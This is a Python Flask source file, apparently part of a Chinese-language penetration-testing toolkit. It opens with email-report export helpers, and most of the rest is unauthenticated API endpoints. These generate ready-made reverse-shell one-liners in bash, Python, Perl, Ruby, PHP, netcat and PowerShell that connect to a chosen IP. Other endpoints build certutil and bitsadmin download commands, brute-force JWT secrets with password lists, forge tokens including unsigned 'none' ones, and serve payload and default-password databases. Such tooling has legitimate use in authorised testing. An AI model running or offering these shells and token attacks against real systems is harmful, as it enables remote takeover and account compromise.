        html += "<h2>附件列表</h2><table><tr><th>文件名</th><th>大小</th><th>类型</th><th>危险</th></tr>"
        for att in data.get('attachments', []):
            danger_class = ' class="danger"' if att.get('is_dangerous') else ''
            html += f"<tr><td>{escape_html_export(att.get('filename', ''))}</td><td>{att.get('size', 0)}</td><td>{escape_html_export(att.get('content_type', ''))}</td><td{danger_class}>{'是' if att.get('is_dangerous') else '否'}</td></tr>"
        html += "</table>"

    if data.get('text_body'):
        html += f"<h2>邮件正文</h2><pre>{escape_html_export(data.get('text_body', ''))}</pre>"

    html += "</body></html>"

    return Response(
        html,
        mimetype='text/html',
        headers={'Content-Disposition': f'attachment; filename={filename}.html'}
    )

def export_pdf(data, filename):
    """导出PDF格式（简化版，使用HTML转PDF）"""
    # 如果没有安装专门的PDF库，返回HTML并提示
    html_content = export_html_report(data, filename)
    # 简单处理：返回HTML，让浏览器打印为PDF
    return html_content

def export_all(data, filename, include_attachments):
    """导出所有格式（ZIP压缩包）"""
    output = io.BytesIO()

    with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Excel
        try:
            import openpyxl
            excel_data = io.BytesIO()
            wb = openpyxl.Workbook()
            ws = wb.active
            ws['A1'] = "邮件分析报告"
            ws['A2'] = "主题"
            ws['B2'] = data.get('subject', '')
            ws['A3'] = "日期"
            ws['B3'] = data.get('date', '')
            wb.save(excel_data)
            zf.writestr(f'{filename}.xlsx', excel_data.getvalue())
        except Exception as e:
            zf.writestr('excel_error.txt', f'Excel导出失败: {str(e)}')

        # Markdown - 直接生成内容
        md = generate_markdown_content(data)
        zf.writestr(f'{filename}.md', md)

        # HTML - 直接生成内容
        html = generate_html_content(data)
        zf.writestr(f'{filename}.html', html)

        # 附件
        if include_attachments and data.get('attachments'):
            for i, att in enumerate(data.get('attachments', [])):
                try:
                    att_data = base64.b64decode(att.get('data', ''))
                    att_name = _safe_archive_name(att.get('filename'), f'attachment_{i}')
                    zf.writestr(f'attachments/{att_name}', att_data)
                except Exception as e:
                    pass

    output.seek(0)

    return send_file(
        output,
        mimetype='application/zip',
        as_attachment=True,
        download_name=f'{filename}.zip'
    )


def _safe_archive_name(value, fallback):
    """防止导出 ZIP 内出现 ../ 或绝对路径条目。"""
    name = os.path.basename(str(value or '').replace('\\', '/')).strip()
    name = ''.join(ch for ch in name if ch >= ' ' and ch not in '/\\:')[:180]
    return name or fallback

def generate_markdown_content(data):
    """生成Markdown内容"""
    md = "# 邮件分析报告\n\n"
    md += f"生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    md += "## 基本信息\n\n"
    md += "| 项目 | 内容 |\n"
    md += "|------|------|\n"
    md += f"| 主题 | {data.get('subject', '')} |\n"
    md += f"| 日期 | {data.get('date', '')} |\n"
    md += f"| 发件人 | {format_address_for_export(data.get('from'))} |\n"
    md += f"| 收件人 | {', '.join([format_address_for_export(a) for a in data.get('to', [])])} |\n"
    md += f"| Message-ID | {data.get('message_id', '')} |\n\n"

    if data.get('links'):
        md += "## 链接列表\n\n"
        for link in data.get('links', []):
            md += f"- {link.get('url', '')} `{link.get('type', 'link')}`\n"
        md += "\n"

    if data.get('attachments'):
        md += "## 附件列表\n\n"
        md += "| 文件名 | 大小 | 类型 |\n"
        md += "|--------|------|------|\n"
        for att in data.get('attachments', []):
            md += f"| {att.get('filename', '')} | {att.get('size', 0)} | {att.get('content_type', '')} |\n"

    return md

def generate_html_content(data):
    """生成HTML内容"""
    html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>邮件分析报告</title>
    <style>
        body {{ font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }}
        h1, h2 {{ color: #0077cc; }}
        table {{ border-collapse: collapse; width: 100%; margin: 10px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background: #0077cc; color: white; }}
    </style>
</head>
<body>
    <h1>邮件分析报告</h1>
    <p>生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    <h2>基本信息</h2>
    <table>
        <tr><th>项目</th><th>内容</th></tr>
        <tr><td>主题</td><td>{escape_html_export(data.get('subject', ''))}</td></tr>
        <tr><td>日期</td><td>{escape_html_export(data.get('date', ''))}</td></tr>
        <tr><td>发件人</td><td>{escape_html_export(format_address_for_export(data.get('from')))}</td></tr>
        <tr><td>收件人</td><td>{escape_html_export(', '.join([format_address_for_export(a) for a in data.get('to', [])]))}</td></tr>
        <tr><td>Message-ID</td><td>{escape_html_export(data.get('message_id', ''))}</td></tr>
    </table>
"""

    if data.get('links'):
        html += "<h2>链接列表</h2><table><tr><th>URL</th><th>类型</th></tr>"
        for link in data.get('links', []):
            html += f"<tr><td>{escape_html_export(link.get('url', ''))}</td><td>{escape_html_export(link.get('type', ''))}</td></tr>"
        html += "</table>"

    if data.get('attachments'):
        html += "<h2>附件列表</h2><table><tr><th>文件名</th><th>大小</th><th>类型</th></tr>"
        for att in data.get('attachments', []):
            html += f"<tr><td>{escape_html_export(att.get('filename', ''))}</td><td>{att.get('size', 0)}</td><td>{escape_html_export(att.get('content_type', ''))}</td></tr>"
        html += "</table>"

    html += "</body></html>"
    return html

def format_address_for_export(addr):
    """格式化地址用于导出"""
    if not addr:
        return ''
    if isinstance(addr, str):
        return addr
    if addr.get('name'):
        return f"{addr.get('name')} <{addr.get('email')}>"
    return addr.get('email', '')

def escape_html_export(text):
    """HTML转义"""
    if not text:
        return ''
    return str(text).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')

# ========== RAW链接支持 ==========

@tools_bp.route('/raw')
def raw_command():
    """返回原始命令文本（用于分享）"""
    value = request.args.get('value', '')
    return value, 200, {'Content-Type': 'text/plain; charset=utf-8'}

@tools_bp.route('/shell/<path:shell_name>')
def raw_shell_command(shell_name):
    """返回原始shell命令（用于分享）"""
    from urllib.parse import unquote

    # 解码shell名称
    shell_name = unquote(shell_name)

    # 获取参数
    ip = request.args.get('ip', '10.10.10.10')
    port = request.args.get('port', '9001')

    # 基于shell名称生成简单的命令
    commands = {
        'Bash -i': f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        'Bash -c': f'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"',
        'Python': f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        'Python3': f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        'PHP': f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        'Perl': f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
        'Ruby': f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        'Netcat': f'nc -e /bin/sh {ip} {port}',
        'Netcat OpenBSD': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
        'PowerShell': f'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'
    }

    # 查找匹配的命令
    for name, cmd in commands.items():
        if name.lower().replace(' ', '-').replace('(', '').replace(')', '') in shell_name.lower():
            return cmd, 200, {'Content-Type': 'text/plain; charset=utf-8'}

    # 默认返回bash命令
    return f'bash -i >& /dev/tcp/{ip}/{port} 0>&1', 200, {'Content-Type': 'text/plain; charset=utf-8'}


# ============================================================
# 工具 API 端点 (需要 Token 认证)
# ============================================================

from functools import wraps

def tools_api_required(f):
    """工具API装饰器（独立SaaS版：开放访问，无需认证）"""
    return f


# --- Payload数据库 API ---

@tools_bp.route('/api/payloads', methods=['GET'])
@tools_api_required
def api_payloads():
    """API: 获取Payload数据库"""
    payload_type = request.args.get('type', 'web')  # web / intranet / commands
    keyword = request.args.get('keyword', '').lower()

    data_path = os.path.join(current_app.root_path, 'data', 'payloader.json')
    try:
        with open(data_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
    except:
        return jsonify({'error': '数据加载失败'}), 500

    if payload_type == 'web':
        items = data.get('webPayloads', [])
    elif payload_type == 'intranet':
        items = data.get('intranetPayloads', [])
    elif payload_type == 'commands':
        items = data.get('toolCommands', [])
    else:
        return jsonify({'error': '无效的类型', 'available': ['web', 'intranet', 'commands']}), 400

    if keyword:
        items = [i for i in items if keyword in json.dumps(i, ensure_ascii=False).lower()]

    return jsonify({'type': payload_type, 'count': len(items), 'items': items[:100]})


# --- 默认密码数据库 API ---

@tools_bp.route('/api/passwords', methods=['GET'])
@tools_api_required
def api_passwords():
    """API: 查询默认密码数据库"""
    keyword = request.args.get('keyword', '').lower()
    category = request.args.get('category', '')

    data_path = os.path.join(current_app.root_path, 'static', 'security_tools', 'json', 'passwords.json')
    try:
        with open(data_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
    except:
        return jsonify({'error': '数据加载失败'}), 500

    items = data if isinstance(data, list) else data.get('passwords', data.get('items', []))

    if keyword:
        items = [i for i in items if keyword in json.dumps(i, ensure_ascii=False).lower()]
    if category:
        items = [i for i in items if category.lower() in json.dumps(i, ensure_ascii=False).lower()]

    return jsonify({'count': len(items), 'items': items[:100]})


# --- Windows补丁漏洞数据库 API ---

@tools_bp.route('/api/win-patches', methods=['GET'])
@tools_api_required
def api_win_patches():
    """API: 查询Windows补丁提权漏洞数据"""
    keyword = request.args.get('keyword', '').lower()

    data_path = os.path.join(current_app.root_path, 'static', 'security_tools', 'json', 'win-patch-exp-data.json')
    try:
        with open(data_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
    except:
        return jsonify({'error': '数据加载失败'}), 500

    items = data if isinstance(data, list) else data.get('items', [])

    if keyword:
        items = [i for i in items if keyword in json.dumps(i, ensure_ascii=False).lower()]

    return jsonify({'count': len(items), 'items': items[:100]})


# --- 传输命令生成 API ---

@tools_bp.route('/api/download', methods=['POST'])
@tools_api_required
def api_download_cmd():
    """API: 生成传输命令"""
    data = request.get_json() or {}
    url = data.get('url', '')
    filename = data.get('filename', 'file')
    platform = data.get('platform', 'linux')

    if not url:
        return jsonify({'error': '缺少url'}), 400

    commands = {
        'linux': {
            'curl': f'curl -o {filename} {url}',
            'wget': f'wget -O {filename} {url}',
            'python': f"python3 -c \"import urllib.request;urllib.request.urlretrieve('{url}','{filename}')\"",
        },
        'windows': {
            'powershell': f'Invoke-WebRequest -Uri "{url}" -OutFile "{filename}"',
            'certutil': f'certutil -urlcache -split -f "{url}" {filename}',
            'bitsadmin': f'bitsadmin /transfer job /download /priority high "{url}" {filename}',
        }
    }

    platform_cmds = commands.get(platform, commands['linux'])
    return jsonify({'platform': platform, 'commands': platform_cmds})


# --- JWT API ---

@tools_bp.route('/api/jwt/decode', methods=['POST'])
@tools_api_required
def api_jwt_decode():
    """API: 解码JWT Token"""
    data = request.get_json() or {}
    token = data.get('token', '')
    if not token:
        return jsonify({'error': '缺少token'}), 400
    parts = token.split('.')
    if len(parts) != 3:
        return jsonify({'error': '无效的JWT格式'}), 400
    try:
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
        return jsonify({'header': header, 'payload': payload, 'signature': parts[2], 'algorithm': header.get('alg')})
    except Exception as e:
        return jsonify({'error': f'解码失败: {str(e)}'}), 400


@tools_bp.route('/api/jwt/generate', methods=['POST'])
@tools_api_required
def api_jwt_generate():
    """API: 生成JWT Token"""
    data = request.get_json() or {}
    header = data.get('header', {'alg': 'HS256', 'typ': 'JWT'})
    payload = data.get('payload', {})
    secret = data.get('secret', '')
    algo = header.get('alg', 'HS256')

    def b64url_encode(d):
        if isinstance(d, dict):
            d = json.dumps(d, separators=(',', ':'))
        return base64.urlsafe_b64encode(d.encode('utf-8')).decode('utf-8').rstrip('=')

    message = b64url_encode(header) + '.' + b64url_encode(payload)

    if algo == 'none':
        token = message + '.'
    elif algo.startswith('HS'):
        hash_map = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
        hash_func = hash_map.get(algo)
        if not hash_func:
            return jsonify({'error': f'不支持的算法: {algo}'}), 400
        sig = hmac.new(secret.encode('utf-8'), message.encode('utf-8'), hash_func).digest()
        token = message + '.' + base64.urlsafe_b64encode(sig).decode('utf-8').rstrip('=')
    elif algo.startswith('RS') or algo.startswith('PS'):
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa, padding
        if secret.strip().startswith('-----'):
            private_key = serialization.load_pem_private_key(secret.encode('utf-8'), password=None)
        else:
            private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        hash_map = {'RS256': hashes.SHA256, 'RS384': hashes.SHA384, 'RS512': hashes.SHA512,
                     'PS256': hashes.SHA256, 'PS384': hashes.SHA384, 'PS512': hashes.SHA512}
        h = hash_map.get(algo, hashes.SHA256)()
        if algo.startswith('PS'):
            sig = private_key.sign(message.encode('utf-8'), padding.PSS(mgf=padding.MGF1(h), salt_length=padding.PSS.MAX_LENGTH), h)
        else:
            sig = private_key.sign(message.encode('utf-8'), padding.PKCS1v15(), h)
        token = message + '.' + base64.urlsafe_b64encode(sig).decode('utf-8').rstrip('=')
    elif algo.startswith('ES'):
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import ec
        curve_map = {'ES256': ec.SECP256R1(), 'ES384': ec.SECP384R1(), 'ES512': ec.SECP521R1()}
        curve = curve_map.get(algo)
        if not curve:
            return jsonify({'error': f'不支持的算法: {algo}'}), 400
        if secret.strip().startswith('-----'):
            private_key = serialization.load_pem_private_key(secret.encode('utf-8'), password=None)
        else:
            private_key = ec.generate_private_key(curve)
        hash_map = {'ES256': hashes.SHA256, 'ES384': hashes.SHA384, 'ES512': hashes.SHA512}
        sig_raw = private_key.sign(message.encode('utf-8'), ec.ECDSA(hash_map[algo]()))
        from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature
        r, s = decode_dss_signature(sig_raw)
        byte_len = (curve.key_size + 7) // 8
        sig = r.to_bytes(byte_len, 'big') + s.to_bytes(byte_len, 'big')
        token = message + '.' + base64.urlsafe_b64encode(sig).decode('utf-8').rstrip('=')
    elif algo in ('Ed25519', 'Ed448'):
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import ed25519, ed448
        if secret.strip().startswith('-----'):
            private_key = serialization.load_pem_private_key(secret.encode('utf-8'), password=None)
        else:
            private_key = ed25519.Ed25519PrivateKey.generate() if algo == 'Ed25519' else ed448.Ed448PrivateKey.generate()
        sig = private_key.sign(message.encode('utf-8'))
        token = message + '.' + base64.urlsafe_b64encode(sig).decode('utf-8').rstrip('=')
    else:
        return jsonify({'error': f'不支持的算法: {algo}'}), 400

    return jsonify({'token': token, 'algorithm': algo})


# --- JWT 破解 API ---

@tools_bp.route('/api/jwt/crack', methods=['POST'])
@tools_api_required
def api_jwt_crack():
    """API: JWT密钥暴力破解"""
    data = request.get_json() or {}
    token = data.get('token', '')
    dict_type = data.get('dict_type', 'common')
    encoding = data.get('encoding', 'utf8')

    if not token:
        return jsonify({'error': '缺少token'}), 400

    parts = token.split('.')
    if len(parts) != 3:
        return jsonify({'error': '无效的JWT格式'}), 400

    header, algo = jwt_decode_header(parts)
    algo_map = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
    if algo not in algo_map:
        return jsonify({'error': f'算法 {algo} 不支持暴力破解'}), 400

    hash_func = algo_map[algo]
    message = parts[0] + '.' + parts[1]
    target_sig = jwt_decode_signature(parts[2])

    # 内置字典
    dictionaries = {
        'common': ['secret', 'password', '123456', 'admin', 'key', 'jwt', 'token', 'pass', 'root', 'test',
                    'qwerty', 'abc123', 'letmein', 'monkey', 'master', 'dragon', '111111', 'baseball',
                    'iloveyou', 'trustno1', 'sunshine', 'princess', 'welcome', 'shadow', 'superman',
                    'password1', 'password123', 'admin123', 'root123', 'changeme', 'default'],
        'top100': ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111',
                    'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein',
                    '696969', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang',
                    'michael', '654321', 'superman', '1qaz2wsx', '7777777', '121212', '000000']
    }
    dict_list = data.get('custom_dict', dictionaries.get(dict_type, dictionaries['common']))
    if isinstance(dict_list, str):
        dict_list = [s.strip() for s in dict_list.split('\n') if s.strip()]

    found = None
    tried = 0
    for secret in dict_list:
        tried += 1
        try:
            secret_bytes = jwt_encode_secret(secret, encoding)
            computed = hmac.new(secret_bytes, message.encode('utf-8'), hash_func).digest()
            if computed == target_sig:
                found = secret
                break
        except:
            continue

    return jsonify({'found': found is not None, 'secret': found, 'tried': tried, 'total': len(dict_list)})


# --- 反弹Shell API ---

@tools_bp.route('/api/reverse-shell', methods=['POST'])
@tools_api_required
def api_reverse_shell():
    """API: 生成反弹Shell命令"""
    data = request.get_json() or {}
    ip = data.get('ip', '10.10.10.10')
    port = data.get('port', 9001)
    shell_type = data.get('type', 'bash')

    commands = {
        'bash': f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        'bash_c': f'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"',
        'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'perl': f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        'ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        'nc': f'nc -e /bin/sh {ip} {port}',
        'nc_mkfifo': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
        'php': f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    }
    cmd = commands.get(shell_type)
    if not cmd:
        return jsonify({'error': f'不支持的类型: {shell_type}', 'available': list(commands.keys())}), 400

    return jsonify({'command': cmd, 'type': shell_type, 'ip': ip, 'port': port})


# --- 邮件分析 API ---

@tools_bp.route('/api/email/analyze', methods=['POST'])
@tools_api_required
def api_email_analyze():
    """API: 分析邮件内容"""
    import re
    from email import policy
    from email.parser import BytesParser
    from email.utils import parseaddr
    from email.header import decode_header

    data = request.get_json() or {}
    content = data.get('content', '')
    if not content:
        return jsonify({'error': '缺少content'}), 400

    if isinstance(content, str):
        content = content.encode('utf-8', errors='replace')

    try:
        msg = BytesParser(policy=policy.default).parsebytes(content)

        def decode_header_value(value):
            if not value:
                return ''
            try:
                parts = decode_header(value)
                result = ''
                for part, charset in parts:
                    result += part.decode(charset or 'utf-8', errors='replace') if isinstance(part, bytes) else str(part)
                return result
            except:
                return str(value)

        from_header = msg.get('From', '')
        name, email_addr = parseaddr(decode_header_value(from_header)) if from_header else ('', '')

        # 提取链接
        text_body = ''
        html_body = ''
        if msg.is_multipart():
            for part in msg.iter_parts():
                ct = part.get_content_type()
                payload = part.get_payload(decode=True)
                if payload:
                    charset = part.get_content_charset() or 'utf-8'
                    body = payload.decode(charset, errors='replace')
                    if ct == 'text/plain' and not text_body:
                        text_body = body
                    elif ct == 'text/html' and not html_body:
                        html_body = body
        else:
            payload = msg.get_payload(decode=True)
            if payload:
                charset = msg.get_content_charset() or 'utf-8'
                body = payload.decode(charset, errors='replace')
                if msg.get_content_type() == 'text/html':
                    html_body = body
                else:
                    text_body = body

        all_text = text_body + ' ' + html_body
        links = list(set(re.findall(r'https?://[^\s<>"\')\]]+', all_text)))

        return jsonify({
            'subject': decode_header_value(msg.get('Subject', '')),
            'from': {'name': name, 'email': email_addr},
            'date': msg.get('Date', ''),
            'links': links[:20],
            'has_attachments': any(part.get_filename() for part in msg.iter_parts()) if msg.is_multipart() else False,
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 400


# --- 工具列表 API ---

@tools_bp.route('/api/tools', methods=['GET'])
@tools_api_required
def api_tools_list():
    """API: 获取可用工具列表"""
    return jsonify({
        'tools': [
            {'name': 'jwt-decode', 'method': 'POST', 'path': '/api/jwt/decode', 'description': '解码JWT Token'},
            {'name': 'jwt-generate', 'method': 'POST', 'path': '/api/jwt/generate', 'description': '生成JWT Token'},
            {'name': 'jwt-crack', 'method': 'POST', 'path': '/api/jwt/crack', 'description': 'JWT密钥暴力破解'},
            {'name': 'reverse-shell', 'method': 'POST', 'path': '/api/reverse-shell', 'description': '生成反弹Shell命令'},
            {'name': 'shell-command', 'method': 'GET', 'path': '/api/shell/{type}', 'description': '获取反弹Shell原始命令'},
            {'name': 'email-analyze', 'method': 'POST', 'path': '/api/email/analyze', 'description': '分析邮件内容'},
            {'name': 'payloads', 'method': 'GET', 'path': '/api/payloads', 'description': 'Payload数据库查询'},
            {'name': 'passwords', 'method': 'GET', 'path': '/api/passwords', 'description': '默认密码数据库查询'},
            {'name': 'win-patches', 'method': 'GET', 'path': '/api/win-patches', 'description': 'Windows补丁提权数据'},
            {'name': 'download-cmd', 'method': 'POST', 'path': '/api/download', 'description': '传输命令生成'},
        ]
    })


# --- Shell命令 API ---

@tools_bp.route('/api/shell/<shell_name>', methods=['GET'])
@tools_api_required
def api_shell_command(shell_name):
    """API: 获取反弹Shell原始命令"""
    from urllib.parse import unquote
    shell_name = unquote(shell_name)
    ip = request.args.get('ip', '10.10.10.10')
    port = request.args.get('port', '9001')

    commands = {
        'bash': f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        'bash_c': f'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"',
        'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'perl': f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        'ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        'nc': f'nc -e /bin/sh {ip} {port}',
        'nc_mkfifo': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
        'php': f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'powershell': f'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
    }

    cmd = commands.get(shell_name)
    if not cmd:
        return jsonify({'error': f'未知类型: {shell_name}', 'available': list(commands.keys())}), 400

    return jsonify({'command': cmd, 'type': shell_name, 'ip': ip, 'port': port})
